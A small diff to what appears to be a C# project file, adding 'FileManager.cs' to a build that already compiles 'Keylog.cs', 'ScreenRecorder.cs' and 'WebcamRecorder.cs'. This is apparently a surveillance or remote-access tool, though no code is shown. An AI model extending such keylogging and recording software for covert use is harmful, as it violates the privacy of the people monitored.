@@ -84,6 +84,7 @@
     </Reference>
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="FileManager.cs" />
     <Compile Include="Keylog.cs" />
     <Compile Include="ScreenRecorder.cs" />
     <Compile Include="WebcamRecorder.cs" />
